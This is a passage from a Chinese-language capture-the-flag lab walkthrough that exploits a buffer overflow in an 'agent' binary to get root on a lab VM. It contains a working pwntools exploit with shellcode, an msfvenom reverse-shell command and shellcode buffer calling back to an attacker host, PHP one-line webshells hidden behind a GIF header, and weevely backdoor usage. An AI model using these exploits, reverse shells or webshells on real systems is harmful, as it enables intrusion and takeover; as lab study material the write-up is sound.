class="hljs-number">0x0</span><br>0e:<span class="hljs-number">0038</span>│      <span class="hljs-number">0xffffd108</span> —▸ <span class="hljs-number">0xf7e49b7d</span> (__overflow+<span class="hljs-number">13</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x16b483</span><br>0f:003c│      <span class="hljs-number">0xffffd10c</span> —▸ <span class="hljs-number">0xf7fb65e0</span> (_IO_file_jumps) ◂— <span class="hljs-number">0</span><br><span class="hljs-number">10</span>:<span class="hljs-number">0040</span>│      <span class="hljs-number">0xffffd110</span> —▸ <span class="hljs-number">0xf7ffd000</span> ◂— <span class="hljs-keyword">and</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xbf</span> /* <span class="hljs-number">0x2bf24</span> */<br><span class="hljs-number">11</span>:<span class="hljs-number">0044</span>│      <span class="hljs-number">0xffffd114</span> —▸ <span class="hljs-number">0x80482c8</span> ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-built_in">ebp</span>*<span class="hljs-number">2</span> + <span class="hljs-number">0x62</span>], <span class="hljs-number">ch</span><br><span class="hljs-number">12</span>:<span class="hljs-number">0048</span>│      <span class="hljs-number">0xffffd118</span> —▸ <span class="hljs-number">0xffffd158</span> —▸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">13</span>:004c│      <span class="hljs-number">0xffffd11c</span> ◂— <span class="hljs-number">0x6191c00</span><br><span class="hljs-number">14</span>:<span class="hljs-number">0050</span>│      <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xf7fb5d20</span> (_IO_2_1_stdout_) ◂— <span class="hljs-keyword">xchg</span>   <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">ebp</span> /* <span class="hljs-number">0xfbad2887</span> */<br><span class="hljs-number">15</span>:<span class="hljs-number">0054</span>│      <span class="hljs-number">0xffffd124</span> —▸ <span class="hljs-number">0xf7dd453c</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">16</span>:<span class="hljs-number">0058</span>│      <span class="hljs-number">0xffffd128</span> ◂— <span class="hljs-number">0x7</span><br><span class="hljs-number">17</span>:005c│      <span class="hljs-number">0xffffd12c</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">18</span>:<span class="hljs-number">0060</span>│      <span class="hljs-number">0xffffd130</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br>1a:<span class="hljs-number">0068</span>│      <span class="hljs-number">0xffffd138</span> —▸ <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">1b</span>:006c│      <span class="hljs-number">0xffffd13c</span> —▸ <span class="hljs-number">0xf7e20469</span> (__isoc99_scanf+<span class="hljs-number">41</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>, <span class="hljs-number">0x1c</span><br>1c:<span class="hljs-number">0070</span>│      <span class="hljs-number">0xffffd140</span> —▸ <span class="hljs-number">0xf7fb5580</span> (_IO_2_1_stdin_) ◂— <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">edx</span>], <span class="hljs-number">ah</span> /* <span class="hljs-number">0xfbad2288</span> */<br><span class="hljs-number">1d</span>:<span class="hljs-number">0074</span>│      <span class="hljs-number">0xffffd144</span> —▸ <span class="hljs-number">0x8048af2</span> ◂— <span class="hljs-keyword">and</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x450a0064</span> /* <span class="hljs-string">&#x27;%d&#x27;</span> */<br>1e:<span class="hljs-number">0078</span>│      <span class="hljs-number">0xffffd148</span> —▸ <span class="hljs-number">0xffffd164</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>1f:007c│      <span class="hljs-number">0xffffd14c</span> ◂— <span class="hljs-number">0x2</span><br><span class="hljs-number">20</span>:<span class="hljs-number">0080</span>│      <span class="hljs-number">0xffffd150</span> —▸ <span class="hljs-number">0xffffd178</span> ◂— <span class="hljs-number">0x3</span><br><span class="hljs-number">21</span>:<span class="hljs-number">0084</span>│      <span class="hljs-number">0xffffd154</span> —▸ <span class="hljs-number">0xf7ffd990</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">22</span>:<span class="hljs-number">0088</span>│      <span class="hljs-number">0xffffd158</span> —▸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">23</span>:008c│      <span class="hljs-number">0xffffd15c</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">24</span>:<span class="hljs-number">0090</span>│      <span class="hljs-number">0xffffd160</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br><span class="hljs-number">26</span>:<span class="hljs-number">0098</span>│      <span class="hljs-number">0xffffd168</span> —▸ <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">27</span>:009c│      <span class="hljs-number">0xffffd16c</span> —▸ <span class="hljs-number">0x80487ce</span> (menu+<span class="hljs-number">128</span>) ◂— <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">9</span>], <span class="hljs-built_in">al</span><br><span class="hljs-number">28</span>:00a0│      <span class="hljs-number">0xffffd170</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br>2a:00a8│      <span class="hljs-number">0xffffd178</span> ◂— <span class="hljs-number">0x3</span><br>2b:00ac│      <span class="hljs-number">0xffffd17c</span> ◂— <span class="hljs-number">0xa0486ff</span><br>2c:00b0│      <span class="hljs-number">0xffffd180</span> —▸ <span class="hljs-number">0x8048a75</span> ◂— <span class="hljs-keyword">dec</span>    <span class="hljs-built_in">esp</span> /* <span class="hljs-string">&#x27;Login Validated &#x27;</span> */<br><span class="hljs-number">2d</span>:00b4│      <span class="hljs-number">0xffffd184</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>2e:00b8│ <span class="hljs-built_in">ebp</span>  <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br>2f:00bc│      <span class="hljs-number">0xffffd18c</span> —▸ <span class="hljs-number">0x804872f</span> (main+<span class="hljs-number">308</span>) ◂— <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x8048741</span><br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>从而计算得出栈偏移为：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">栈偏移 = <span class="hljs-built_in">EBP</span>地址 - 当前输入地址 + <span class="hljs-built_in">EBP</span>字长<br>       = <span class="hljs-number">0xd188</span> - <span class="hljs-number">0xd0e4</span> + <span class="hljs-number">4</span> = <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure><p>找到栈偏移之后，我们需要将 return 地址修改为 shellcode 地址，这里可以使用 ROPgadget 寻找包含 call eax 的代码段，这里找到 <code>call eax</code> 地址为 0x8048563 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent | grep <span class="hljs-string">&quot;call eax&quot;</span></span><br>0x0804855d : adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x08048561 : add al, 8 ; call eax<br>0x08048563 : call eax<br>0x0804855f : cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855c : in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855a : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855e : push 0x804b03c ; call eax<br>0x0804855b : sub esp, 0x14 ; push 0x804b03c ; call eax<br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent --only <span class="hljs-string">&quot;call&quot;</span></span>    <br>Gadgets information<br>============================================================<br>0x08048941 : call dword ptr [eax + 0x68]<br>0x0804892f : call dword ptr [eax - 0x18]<br>0x08048e1f : call dword ptr [ebx + 1]<br>0x08048563 : call eax<br>0x0804859d : call edx<br><br>Unique gadgets found: 5<br></code></pre></td></tr></table></figure><h3 id="3、exp编写"><a href="#3、exp编写" class="headerlink" title="3、exp编写"></a>3、exp编写</h3><p>用 pwntools 编写脚本，通过 asm 构造 shellcode 内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># agent</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;192.168.135.146&quot;</span>, <span class="hljs-number">7788</span>)<br><br>shellcode = asm(shellcraft.sh())<br>shell_addr = <span class="hljs-number">0x8048563</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;Agent ID : &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;48093572&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Enter selection: &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>io.recv()<br><br>payload = shellcode.ljust(<span class="hljs-number">168</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(shell_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>执行，得到 root 权限，得到最终 flag6{R2gwc3RQcm90MGMwbHM=} ，解码为 flag{Gh0stProt0c0ls}。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br>[+] Opening connection to 192.168.135.146 on port 7788: Done<br>[*] Switching to interactive mode<br>Report: jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04\xe1Q\x89\xe11\xd2j\x0b̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc\x85\x04<br>Submitted for review.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>bin<br>boot<br>dev<br>etc<br>home<br>initrd.img<br>initrd.img.old<br>lib<br>lib32<br>lib64<br>libx32<br>lost+found<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>snap<br>srv<br>sys<br>tmp<br>usr<br>var<br>vmlinuz<br>vmlinuz.old<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> root</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>Flag.txt<br>TheEnd.txt<br><span class="hljs-meta">$</span><span class="bash"> cat Flag.txt</span><br>flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br><span class="hljs-meta">$</span><span class="bash"> </span> <br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、纯虚拟靶场：手动操作，利用 web 漏洞，寻找 flag 。</p><p>2、网页：抓字典</p><p>3、登录爆破：hydra、burp；用户名和密码分开爆破、密码绕过</p><p>4、sql：sqlmap、文件方式、dump慎用</p><p>5、文件上传：waf、绕过方式，结合gif/jpg、eval/system/‘’</p><p>6、一句话成功 - 小马大马：两机间文件传输（python 最容易成功）</p><p>7、反弹马：bash、PHP、java、python</p><p>8、反弹shell：nc、php、python（渗透测试必备、内网渗透基础）</p><p>伪shell - bin/bash、bin/sh（特殊功能键不可用） - 稳定shell（raw：稳定、原生态）    </p><p>伪shell：meterpreter</p><p>bin/bash：python/python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p><p>稳定shell：ctrl + z；stty raw -echo；fg</p><blockquote><p>stty raw -echo    就是用RAW模式来原封不动的传输回显数据，在设置时不要回显多余的信息。也就是常说的稳定shell。<br>fg（frontground）前台执行；bg（background）后台执行<br>Linux提供的 fg 和 bg 命令，可以调度正在运行的任务。</p></blockquote><p>9、一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># eval\system\php反引号=&gt;执行(可能存在过滤)</span><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `id`; <span class="hljs-meta">?&gt;</span><br><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>1、在靶机中获得 ID：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> agent</span> <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ltrace用来跟踪进程调用库函数的情况</span><br><span class="hljs-meta">$</span><span class="bash"> ltrace agent</span><br>__libc_start_main(0x80485fb, 1, 0xffe61b74, 0x8048970 &lt;unfinished ...&gt;<br>setbuf(0xf76fad60, 0)                            = &lt;void&gt;<br>asprintf(0xffe61aa8, 0x80489f0, 0x2ddd984, 0xf75620fc) = 8<br>puts(&quot;  ___ __  __ ___ &quot;  ___ __  __ ___ <br>)                        = 18<br>puts(&quot; |_ _|  \\/  | __|  Agent&quot; |_ _|  \/  | __|  Agent<br>)                = 25<br>puts(&quot;  | || |\\/| | _|   Reporting&quot;  | || |\/| | _|   Reporting<br>)            = 29<br>puts(&quot; |___|_|  |_|_|    System\n&quot; |___|_|  |_|_|    System<br><br>)              = 27<br>printf(&quot;\nAgent ID : &quot;<br>Agent ID : )                          = 12<br>fgets(<br>&quot;\n&quot;, 9, 0xf76fa5a0)                       = 0xffe61aae<br>strncmp(&quot;\n&quot;, &quot;48093572&quot;, 8)                     = -1<br>puts(&quot;Invalid Agent ID &quot;Invalid Agent ID <br>)                        = 18<br>+++ exited (status 254) +++<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> agent</span><br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 0<br>Exiting...<br></code></pre></td></tr></table></figure><p><strong>2、端口敲门服务（端口碰撞）</strong></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/210177505">靶机-简单谈一下端口碰撞技术 (Port Knocking) - 知乎 (zhihu.com)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> knock 192.168.135.146 7482 8279 9467  <span class="hljs-comment"># knock</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146   <span class="hljs-comment"># nmap</span></span><br></code></pre></td></tr></table></figure><p><strong>3、weevely</strong></p><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/106587791">Weevely(Linux中的菜刀)_WHOAMIAnony的博客-CSDN博客</a></p></blockquote><p>后门生成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely generate &lt;连接密码&gt; &lt;file&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely generate <span class="hljs-built_in">test</span> hello.php</span><br>Generated backdoor with password &#x27;test&#x27; in &#x27;hello.php&#x27; of 1486 byte size. <br><span class="hljs-meta">$</span><span class="bash"> find / -name hello.php</span><br>/usr/share/weevely/hello.php<br></code></pre></td></tr></table></figure><p>连接后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely &lt;url&gt; &lt;连接密码&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.110.129/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 3.2.0<br><br>[+] Target:winxp-0947be9ad:C:\phpstudy\WWW<br>[+] Session:/root/.weevely/sessions/192.168.110.129/hello_0.session<br>[+] Shell:System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/b533cd00f6f4.gif hello</span><br></code></pre></td></tr></table></figure><p><strong>4、查找：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -name agent 2&gt;/dev/null  <span class="hljs-comment"># 2&gt;/dev/null：将错误输出到/dev/null,只显示正确结果</span></span><br>/usr/local/bin/agent<br>/etc/xinetd.d/agent<br></code></pre></td></tr></table></figure><p><strong>5、查看端口，端口 7788 也有代理在运行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -ant</span><br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     <br>tcp        0      0 192.168.135.146:36550   192.168.135.141:1234    ESTABLISHED<br>tcp6       0      0 :::22                   :::*                    LISTEN     <br>tcp6       0      0 :::80                   :::*                    LISTEN     <br>tcp6       0      0 192.168.135.146:80      192.168.135.141:46088   ESTABLISHED<br><span class="hljs-meta">$</span><span class="bash"> cat /etc/services | grep 7788</span><br>agent           7788/tcp                        # Agent service<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ps -aux <span class="hljs-comment"># 查询进程</span></span><br><span class="hljs-meta">$</span><span class="bash"> netstat -tulnp | grep 8888</span><br></code></pre></td></tr></table></figure><p><strong>6、当前目录执行 php 脚本开启简易 web 服务器：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> php -S 192.168.135.141:4488</span><br></code></pre></td></tr></table></figure><p><strong>7、提权</strong></p><p>通过缓冲区溢出 agent 进程获得 root 权限。</p><p>使用 msfvenom 创建一个 shellcode：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.135.141 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> -p 选择payload(此次因为agent是32位，所以使用X86)</span><br><span class="hljs-meta">#</span><span class="bash"> LHOST 、LPORT 监测主机IP和端口</span><br><span class="hljs-meta">#</span><span class="bash"> -f 指定生成xxx格式</span><br><span class="hljs-meta">#</span><span class="bash"> -b 在生成的程序中避免出现的值</span><br><span class="hljs-meta">#</span><span class="bash"> \x00 == 0x00 ASCII控制字符表中对应 NULL (空字符)</span><br><span class="hljs-meta">#</span><span class="bash"> \x0a == 0X0a ASCII控制字符表中对应 LF （换行键）</span><br><span class="hljs-meta">#</span><span class="bash"> \x0b == 0x0b ASCII控制字符表中对应 VT (垂直定位符号)</span><br></code></pre></td></tr></table></figure><p>使用大佬写的py脚本，将生成的内容，替换 python 脚本内容：<a href="https://github.com/jessekurrus/agentsploit">https://github.com/jessekurrus/agentsploit</a></p><p>将 shellcode 进行替换，下面部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">buf =  &quot;&quot;<br>buf += &quot;\xba\xf9\x03\x07\x8f\xd9\xe5\xd9\x74\x24\xf4\x5b\x31&quot;<br>buf += &quot;\xc9\xb1\x12\x31\x53\x12\x03\x53\x12\x83\x12\xff\xe5&quot;<br>buf += &quot;\x7a\xd5\xdb\x1d\x67\x46\x9f\xb2\x02\x6a\x96\xd4\x63&quot;<br>buf += &quot;\x0c\x65\x96\x17\x89\xc5\xa8\xda\xa9\x6f\xae\x1d\xc1&quot;<br>buf += &quot;\xaf\xf8\xdf\x1e\x58\xfb\xdf\x31\xf8\x72\x3e\x81\x9e&quot;<br>buf += &quot;\xd4\x90\xb2\xed\xd6\x9b\xd5\xdf\x59\xc9\x7d\x8e\x76&quot;<br>buf += &quot;\x9d\x15\x26\xa6\x4e\x87\xdf\x31\x73\x15\x73\xcb\x95&quot;<br>buf += &quot;\x29\x78\x06\xd5&quot;<br></code></pre></td></tr></table></figure><p>监听端口4448：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4448</span><br></code></pre></td></tr></table></figure><p>执行 exp 代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py 192.168.135.146 7788</span><br></code></pre></td></tr></table></figure><p>连接成功，访问得到 <strong>flag6：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag6">flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br></code></pre></td></tr></table></figure><p><strong>8、图片马：</strong></p><p>在php文件里写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$s</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$s</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再使用 windows 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> copy /b 文件1+文件2 文件3</span><br></code></pre></td></tr></table></figure><p>将php文件和图像文件合并。 